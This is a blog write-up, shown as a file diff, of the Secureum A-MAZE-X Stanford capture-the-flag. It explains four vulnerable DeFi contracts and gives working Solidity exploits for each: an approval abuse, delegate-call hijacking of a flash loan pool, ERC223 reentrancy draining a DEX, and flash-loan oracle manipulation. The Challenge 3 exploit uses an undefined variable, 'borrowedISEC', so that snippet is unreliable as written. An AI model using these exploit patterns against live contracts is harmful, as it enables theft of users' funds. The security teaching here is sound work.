@@ -1,0 +1,424 @@
+# Secureum A-MAZE-X Stanford CTF
+
+<p className="text-xs text-right">August 27, 2022 by [patrickd](/about#patrickd)</p>
+
+Secureum organized a [Capture The Flag Workshop](https://defisecuritysummit.org/defi-security-101/) on the 26th August 2022 during the [First Annual DeFi Security Summit](https://defisecuritysummit.org/). Unfortunately I couldn't personally make it there, but even so I had the chance to take an early look and provide feedback on the [CTF's GitHub repository](https://github.com/eugenioclrc/DeFi-Security-Summit-Stanford).
+
+
+import { Callout } from 'nextra/components'
+
+<Callout type="warning">
+  Note that a few things have changed since the time I solved it. So there might be some discrepancies but the overall Solutions should still be the same.
+</Callout>
+
+This CTF consists of 4 Challenges with increasing difficulty. Since it was happening in the context of a Workshop, there was no competetive aspect to it like it usually would, the goal was to focus on learning and having fun.
+
+
+## [Challenge 0: VitaToken seems safe, right?](https://github.com/eugenioclrc/DeFi-Security-Summit-Stanford#challenge-0-vitatoken-seems-safe-right)
+
+> Let's begin with a simple warm up. Our beloved Vitalik is the proud owner of 100 \$VTLK, which is a token that follows the ERC20 token standard. Or at least that is what it seems...
+>
+> Is there a way for you to steal those tokens from him?
+
+The target for this challenge is the [`Challenge0.VToken.sol`](https://github.com/eugenioclrc/DeFi-Security-Summit-Stanford/blob/master/challenges_sources/Challenge0.VToken.sol) contract. It's a very simple ERC20 implementation that makes use of OpenZeppelin's contracts.
+
+It only deviates from the default behavior in two ways:
+
+- During its creation 100 of the tokens are minted directly to "Vitalik's account".
+- There is a public function called approve(), that allows for approvals.
+
+But, you might know that the ERC20 implementation of OZ already comes with an exposed `approval()` function, so how can there be another one without the `override` keyword being used?
+
+The reason is what Solidity calls "function overloading", but is factually just a completely different function:
+
+- OpenZeppelin's `function approve(address spender, uint256 amount) public virtual override returns (bool){:solidity}` has a function signature from `approve(address,uint256){:solidity}` which is `095ea7b3`
+- The Challenge's `function approve(address owner, address spender, uint256 amount) public returns (bool){:solidity}` has a function signature from `approve(address,address,uint256){:solidity}` which is `e1f21c67`
+
+This means that the ABI descriptions of these two functions can exist alongside each other without clashing.
+
+Now, let's compare the function bodies:
+
+```solidity
+function approve(address spender, uint256 amount) public virtual override returns (bool) {
+    address owner = _msgSender();
+    _approve(owner, spender, amount);
+    return true;
+}
+```
+
+```solidity
+function approve(address owner, address spender, uint256 amount) public returns (bool) {
+    _approve(owner, spender, amount);
+    return true;
+}
+```
+
+There's only one difference between them: OpenZeppelin only allows the `msg.sender`, meaning the owner of the tokens, to give another account an allowance to manage. While the Challenge's ERC20 allows anyone to give allowances for anyone else's tokens.
+
+Exploiting this "feature" to obtain "Vitalik's" token balance is quite simple:
+
+```solidity
+/*//////////////////////////////
+//    Add your hack below!    //
+//////////////////////////////*/
+
+// Give ourselves an unlimited allowance for Vitalik's tokens.
+VToken(token).approve(vitalik, player, type(uint256).max);
+
+// We have "his approval" now and can transfer all of his tokens to us.
+IERC20(token).transferFrom(vitalik, player, IERC20(token).balanceOf(vitalik));
+
+//============================//
+```
+
+First we cast the address of the token (where the ERC20 VitaToken contract is located) to the VToken contract. This allows us to call its non-standard approve function and give us an "unlimited" allowance by specifying the maximum number that a 256 bit integer can represent.
+
+After obtaining this "approval" we can now make use of the standard `transferFrom()` function to send the entire balance of the tokens that "Vitalik" currently owns to the player address.
+
+```solidity
+assertEq(
+    IERC20(token).balanceOf(address(player)),
+    IERC20(token).totalSupply(),
+    "you must get all the tokens"
+);
+```
+
+Having done the transfer will make the winning conditions pass: The total supply of VitaTokens in existance is now equal to the balance of the player account.
+
+```
+ubuntu@eth:~/projects/secureum-stanford\$ forge test --match-path test/Challenge0.t.sol
+[⠊] Compiling...
+[⠰] Compiling 30 files with 0.8.13
+[⠑] Solc 0.8.13 finished in 4.27s
+Compiler run successful (with warnings)
+Running 1 test for test/Challenge0.t.sol:Challenge0Test
+[PASS] testChallenge() (gas: 69092)
+Test result: ok. 1 passed; 0 failed; finished in 4.21ms
+```
+
+
+## [Challenge 1: What a nice Lender Pool!](https://github.com/eugenioclrc/DeFi-Security-Summit-Stanford#challenge-1-what-a-nice-lender-pool)
+
+>Secureum has raised a lot of Ether and decided to buy a bunch of *InSecureumToken*s (**\$ISEC**) in order to make them available to the community via flash loans. This is made possible by means of the InSecureumLenderPool contract.
+>
+>The idea is that anyone can deposit **\$ISEC**s to enlarge the pool's resources.
+>
+>Will you be able to steal the **\$ISEC**s from the `InSecureumLenderPool`?
+
+Let's first check the [`InSecureumToken`](https://github.com/eugenioclrc/DeFi-Security-Summit-Stanford/blob/master/challenges_sources/tokens/tokenInsecureum.sol) contract we're dealing with. This time, no extra "features" have been added, it's a simple ERC20 token. All the constructor does is minting the specified amount of tokens to whoever will deploy it, the `msg.sender`.
+
+With that out of the way let's take a look at [*Challenge1.lenderpool.sol*](https://github.com/eugenioclrc/DeFi-Security-Summit-Stanford/blob/master/challenges_sources/Challenge1.lenderpool.sol).
+
+The idea of this contract is quite simple: Users are able to `deposit()` and `withdraw()` tokens to and from the pool contract. Deposited tokens can be used by third parties to borrow large amounts of tokens from this pool to, for example, make a profit using them for arbitrage. After they are done using them, they have to return all tokens, otherwise the entire transaction will fail and so will their arbitrage trade. Usually flash loaning comes with a fee that is then distributed to depositors, which incentivices the deposit in the first place. But this was likely omitted for simplicity.
+
+If we are supposed to steal all of the deposited tokens, the issue likely lies in the `flashLoan()` function itself:
+
+```solidity
+function flashLoan(
+    address borrower,
+    bytes calldata data
+)
+    external
+{
+    uint256 balanceBefore = inSecureumToken.balanceOf(address(this));
+
+    _flashLoan = true;
+
+    borrower.functionDelegateCall(data);
+
+    _flashLoan = false;
+
+    uint256 balanceAfter = inSecureumToken.balanceOf(address(this));
+    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
+}
+```
+
+As is common, this flash loan works with callback-functions: We begin the loan by executing the `flashLoan()` function and specify a borrower contract that'll receive the loan. It'll then take note of the balance before and after it calls into a callback function that we specified as part of `data`. To make sure that we paid back the loanm it `requires` the balance after to be greater or equal to the balance before.
+
+You might also notice that it sets a and unsets a boolean state variable before and after the callback is executed. This is in a way a "reentrancy protection" to prevent us from re-depositing the loan in our own name back into the pool. That would basically allow us to ensure that the balance after is correct and at the same time allow us to `withdraw()` the tokens as if they were ours.
+
+Where things get interesting is when you notice that nowhere before the callback is executed, the loan is sent to the borrower. Apparently the Pool expects us to take as much as we need ourselves. It's doing that by delegate-calling the callback. That means the callback will be executed as if it were a function of the Pool itself, giving us access to the funds. But that also means we can do anything else we want with that power as long as we make sure that the `balanceAfter` i still correct.
+
+So what can we do while having full control over the Pool's "identity"? We can make use of something that we've learned about in the first Challenge: Token approvals.
+
+```solidity
+/*//////////////////////////////
+//    Add your hack below!    //
+//////////////////////////////*/
+
+// STEP 0: Deploy the Exploit contract.
+Exploit exploit = new Exploit();
+
+// STEP 1: Trigger the flash loan.
+vulnerable.flashLoan(
+    // Pool should delegate call into the Exploit  contract.
+    address(exploit),
+    // Create an ABI-encoded call as data.
+    abi.encodeWithSelector(
+        // The function of the Exploit to be called.
+        Exploit.flashloanCallback.selector,
+        // The function arguments:
+        token, // The token to call the approve() function on
+        player // The player address this test contract is currently pretending to be
+    )
+);
+
+// STEP 3: With the approval given by the callback,
+// transfer all of the Pool's token to the player account.
+token.transferFrom(
+    address(vulnerable),
+    player,
+    token.balanceOf(address(vulnerable))
+);
+
+//============================//
+```
+
+```solidity
+/*////////////////////////////////////////////////////////////
+//          DEFINE ANY NECESSARY CONTRACTS HERE             //
+////////////////////////////////////////////////////////////*/
+
+contract Exploit {
+    // STEP 2: This callback function will be delegate-called by the pool.
+    function flashloanCallback(IERC20 poolToken, address testAddress) external {
+        // Having the pools context and therefore identity,
+        // we can give this contract an unlimited approval.
+        poolToken.approve(testAddress, type(uint256).max);
+    }
+}
+```
+
+As you can see, we're not actually borrowing any of the tokens in the Pool. All we do is make use of the Pool's identity to give the player an unlimited allowance. This allowance will still be there once the `flashLoan()` function has finished and determined that everything is in order since the balances still match. Then afterwards we can exploit the approval to transfer out the tokens from the Pool.
+
+The interesting thing about this way to exploit it is, that even if the delegate-call would be changed to a normal call, it would still be vulnerable! The `flashLoan()` function allows us to specify any address as a borrower and it would then make an arbitrary call to this address with the data we provided it. What if we specify the token as the borrower? What if we specify the approve function as data? The pool would make this external call and effectively the same as before would happen.
+
+But there's more! As mentioned previously, delegate-calling is as if the called function is part of the Pool. That also means we obtain access to its state variables:
+
+- We could replace the token in the `inSecureumToken` variable with some other worthless token that claims that the pool has the appropriate balance. We can just keep the real tokens!
+- We could toggle the `_flashLoan` variable and would be able to re-enter the Pool by calling `deposit()`. That way we can re-redeposit the loaned money as if it was ours and later `withdraw()` it too!
+- But we don't even have to bother with calling the `deposit()` function. Why not just directly change the `balances` variable and assign the entire Pool's funds as balance to us?
+
+External calls, and especially delegate-calls, are quite powerful and dangerous.
+
+
+## [Challenge 2: it's always sunny in decentralized exchanges](https://github.com/eugenioclrc/DeFi-Security-Summit-Stanford#challenge-2-its-always-sunny-in-decentralized-exchanges)
+
+>I bet you are familiar with **decentralized exchanges**: a magical place where one can exchange different tokens. `InsecureDexLP` is exactly that: a ~~very insecure~~ Uniswap-kind-of decentralized exchange. Recently, the **\$ISEC** token got listed in this dex and can be traded against a *not-so-popular* token called **\$SET**.
+>
+>* The dex has an initial liquidity for our pair of interest, which can be increased by anyone through token deposits.
+>
+>* Adding liquidity to the dex, rewards liquidity pool tokens (LP tokens) which can be redeemed in any moment for the original funds.
+>
+>Will you be able to drain all of *InsecureDexLP's* **\$ISEC**/**\$SET** liquidity?
+
+Things certainly seem to get harder now! Let's start by looking at the success conditions:
+
+```solidity
+assertEq(token0.balanceOf(player), 10 ether, "Player should have 10 ether of token0");
+assertEq(token1.balanceOf(player), 10 ether, "Player should have 10 ether of token1");
+assertEq(token0.balanceOf(address(target)), 0, "Dex should be empty (token0)");
+assertEq(token1.balanceOf(address(target)), 0, "Dex should be empty (token1)");
+```
+
+It seems that, to beat this challenge, the `InsecureDexLP` needs to be completely drained and the player account should have 10 ether (10e18) worth of each token in the end.
+
+The [challenge set-up](https://github.com/eugenioclrc/secureum-stanford/blob/master/test/Challenge2.t.sol#L20) looks complicated but all that happens is minting these tokens and then adding 9 of each as liquidity to the DEX and sending the rest to the player.
+
+The **\$ISEC** Token is same one from the previous challenge, which used OpenZeppelin's contracts. The **\$SET** Token on the other hand appears to be using a custom implementation called [`SimpleERC223Token`](https://github.com/eugenioclrc/secureum-stanford/blob/master/src/tokens/tokenERC223.sol).
+
+ERC223? It basically adjusts the ERC20 standard adding new features while staying backwards compatible, most importantly:
+
+* Tokens can no longer be accidentially sent to contracts that don't know how to handle them, locking them within the contract forever.
+* Recipient contracts are able to react to receiving tokens by implementing a *`tokenFallback()`* function, basically a hook that is called immediately after the token balances were updated.
+
+If you're familiar with common implementations of ERC20 Tokens, you might wonder why this apparently wasn't widely adopted, and the explanation for this is likely part of the solution...
+
+Let's move on and take a look at [`InsecureDexLP`](https://github.com/eugenioclrc/secureum-stanford/blob/master/src/Challenge2.DEX.sol) which is the actual target of this challenge. Now, this might look a bit overwhelming at first, but remember, the goal is to transfer-out all of the liquidity from this contract, not a complete code review.
+
+There's only one place in this contract where both tokens are transferred to the `msg.sender`, the `removeLiquidity()` function, making it a prime target:
+
+```solidity
+function removeLiquidity(uint256 amount) external returns (uint amount0, uint amount1) {
+    require(_balances[msg.sender] >= amount);
+    unchecked {
+        amount0 = (amount * reserve0) / totalSupply;
+        amount1 = (amount * reserve1) / totalSupply;
+    }
+    require(amount0 > 0 && amount1 > 0, 'InsecureDexLP: INSUFFICIENT_LIQUIDITY_BURNED');
+
+    token0.safeTransfer(msg.sender, amount0);
+    token1.safeTransfer(msg.sender, amount1);
+
+    unchecked {
+        _balances[msg.sender] -= amount;
+        totalSupply -= amount;
+    }
+
+    _updateReserves();
+}
+```
+
+1. First, it checks that our liqidity balance is sufficient for the requested amount to withdraw.
+2. Then, it calculates the actual amounts for each token to withdraw.
+3. Next, the tokens are transferred to the `msg.sender`.
+4. Finally, the liquidity balance is updated, so on the next call we won't be able to withdraw what we have already withdrawn.
+
+Under normal ERC20-circumstances, this shouldn't cause any issues, but here, one of the tokens is an ERC223 allowing a smart contract recipient to react upon receiving the Tokens. And it can do so *before* the liqudity balance is updated.
+
+This means we can *re-enter* into the `InsecureDexLP` and remove the same liquidity once more. And then, once more and once more?
+
+```solidity
+/*//////////////////////////////
+//    Add your hack below!    //
+//////////////////////////////*/
+
+// STEP 0: Deploy, fund and execute Exploit.
+Exploit exploit = new Exploit(token0, token1, target, player);
+token0.approve(address(exploit), type(uint256).max);
+token1.approve(address(exploit), type(uint256).max);
+exploit.run();
+
+//============================//
+```
+
+```solidity
+contract Exploit {
+    IERC20 immutable token0;
+    IERC20 immutable token1;
+    InsecureDexLP immutable target;
+    address immutable player;
+    constructor(IERC20 _token0, IERC20 _token1, InsecureDexLP _target, address _player) {
+        (token0, token1, target, player) = (_token0, _token1, _target, _player);
+    }
+    function run() external {
+        // STEP 1: Add all of the Player's Tokens as liquidity.
+        token0.transferFrom(msg.sender, address(this), 1 ether);
+        token1.transferFrom(msg.sender, address(this), 1 ether);
+        token0.approve(address(target), type(uint256).max);
+        token1.approve(address(target), type(uint256).max);
+        target.addLiquidity(1 ether, 1 ether);
+
+        // STEP 2: Withdraw liqudity again, triggering receive hook below.
+        uint256 amount = target.balanceOf(address(this));
+        target.removeLiquidity(amount);
+    }
+    function tokenFallback(address, uint256, bytes memory) external {
+        // STEP 3 to 12: Keep withdrawing liqudity as long as the pool still has tokens.
+        if (token0.balanceOf(address(target)) > 0) {
+            uint256 amount = target.balanceOf(address(this)); // Our balance wasn't updated yet
+            target.removeLiquidity(amount); // So we can keep withdrawing it
+        }
+        // STEP 13: Once all tokens were drained, transfer them to the player.
+        else {
+            token0.transfer(player, 10 ether);
+            token1.transfer(player, 10 ether);
+        }
+    }
+}
+```
+
+You might still be struggling to grasp the concept of re-entrancy, in that case this call stack might help:
+
+1. removeLiquidity: Balance check
+1. removeLiquidity: Calculate withdrawal amounts
+1. removeLiquidity: Transfer tokens
+    1. SimpleERC223Token's transfer() function calls the recipient's tokenFallback()
+        1. removeLiquidity: Balance check
+        1. removeLiquidity: Calculate withdrawal amounts
+        1. removeLiquidity: Transfer tokens
+            1. SimpleERC223Token's transfer() function calls the recipient's tokenFallback()
+                1. removeLiquidity: Balance check
+                1. removeLiquidity: Calculate withdrawal amounts
+                1. removeLiquidity: Transfer tokens
+                    1. SimpleERC223Token's transfer() function calls the recipient's tokenFallback()
+                        1. ...
+                1. removeLiquidity: Balance update
+        1. removeLiquidity: Balance update
+1. removeLiquidity: Balance update
+
+As you can see, the balance is actually updated multiple times, but only once the same liquidity has already been withdrawn multiple times via the tokenFallback() hook. Normally the second balance update would revert though since the integer would underflow, but because the update is within an `unchecked`-block the integer will instead wrap around to the highest possible integer.
+
+
+## [Challenge 3: borrow, hide and seek](https://github.com/eugenioclrc/DeFi-Security-Summit-Stanford#challenge-3-borrow-hide-and-seek)
+
+>Finally, as a conclusion to this ~~not-so-secure~~ ecosystem, the Secureum team built the `BorrowSystemInsecureOracle` lending platform where one can borrow and loan **\$ISEC** and `BoringToken` (**\$BOR**). Both tokens can be borrowed by either providing themselves or the other token as collateral.
+>
+>* The dex has an initial amount of funds that can be borrowed from.
+>
+>* Users can add collateral and take loans from `BorrowSystemInsecureOracle`.
+>
+>* Users may also get liquidated.
+>
+>* `BorrowSystemInsecureOracle` uses the `InsecureDexLP` to compute the **\$ISEC**/**\$BOR** price.
+>
+>Will you be able to drain *BorrowSystemInsecureOracle*'s **\$ISEC**/**\$BOR** liquidity?
+
+Here we have the usual **\$ISEC** and a similarly boring **\$BOR** token, both making use of OpenZeppelin's ERC20 implementation. The DEX and even the Flash Loan lending pool from the previous Challenges are making a comeback - this time though, we're supposed to exploit [`BorrowSystemInsecureOracle`](https://github.com/eugenioclrc/secureum-stanford/blob/master/src/Challenge3.borrow_system.sol) contract. It appears we can take overcollateralized loans from this contract - or at least that's what's supposed to happen...
+
+Before getting ahead of ourselves let's look at the [challenge setup](https://github.com/eugenioclrc/secureum-stanford/blob/master/test/Challenge3.t.sol#L31):
+
+1. 30.000 **\$ISEC** and 20.000 **\$BOR** are minted
+1. 100 of each token are added as liqudity to `InsecureDexLP`
+1. 10.000 **\$ISEC** are added to `InSecureumLenderPool`
+1. 10.000 of each token are added to `BorrowSystemInsecureOracle`
+
+The success conditions are simple: Drain all **\$ISEC** tokens from `BorrowSystemInsecureOracle`
+
+```solidity
+assertEq(token0.balanceOf(address(target)), 0, "You should empty the target contract");
+```
+
+To summarize: We can borrow one token while locking the other as collateral. How much we can borrow depends on the value of the collateral. The value of the collateral is based on the price that the Tokens are currently being traded with in the DEX.
+
+The `InsecureDexLP` is a [Constant Function Market Maker](https://medium.com/bollinger-investment-group/constant-function-market-makers-defis-zero-to-one-innovation-968f77022159), meaning the price of the Tokens is based on their supply in the DEX. So if there's a lot of one Token and very little of the other, the prices are going to be extremely skewed - that means, market participants who have a lot of Tokens can use this to manipulate prices. We don't have many Tokens, but we have an `InSecureumLenderPool` that provides us with uncollateralized and free flash loans!
+
+```solidity
+// STEP 0: Deploy the Exploit and trigger the exploit by taking a flash loan.
+Exploit exploit = new Exploit(token0, token1, target, oracleDex, player);
+flashLoanPool.flashLoan(
+    // Pool should delegate call into the Exploit contract.
+    address(exploit),
+    // Create an ABI-encoded call as data.
+    abi.encodeWithSelector(Exploit.flashloanCallback.selector)
+);
+```
+
+```solidity
+contract Exploit {
+    IERC20 immutable token0;
+    IERC20 immutable token1;
+    BorrowSystemInsecureOracle immutable target;
+    InsecureDexLP immutable dex;
+    address immutable player;
+    constructor(IERC20 _token0, IERC20 _token1, BorrowSystemInsecureOracle _target, InsecureDexLP _dex, address _player) {
+        (token0, token1, target, dex, player) = (_token0, _token1, _target, _dex, _player);
+    }
+
+    // STEP 1: This callback function will be delegate-called by the pool.
+    function flashloanCallback() external {
+        // STEP 2: Swap all flash loanable ISEC tokens to BOR to manipulate the price.
+        token0.approve(address(dex), type(uint256).max);
+        uint256 flashLoanedISEC = token0.balanceOf(address(this));
+        dex.swap(address(token0), address(token1), flashLoanedISEC);
+
+        // The price of BOR should now be really high and we have lot's of it!
+
+        // STEP 3: Deposit the "very valuable" BOR as collateral.
+        token1.approve(address(target), type(uint256).max);
+        uint256 swappedBOR = token1.balanceOf(address(this));
+        target.depositToken(swappedBOR);
+
+        // STEP 4: Borrow all of the ISEC tokens.
+        uint256 borrowableISEC = token0.balanceOf(address(target));
+        target.borrowInsecureum(borrowableISEC);
+
+        // STEP 5: Transfer all ISEC tokens we "arbitraged" to the player.
+        token0.transfer(player, borrowedISEC - flashLoanedISEC);
+
+        // We made sure to leave enough ISEC to repay the flash loan (because we're nice).
+    }
+}
+```
+
+This challenge was a lesson on why to never trust DEX's current prices as a price feed oracle!
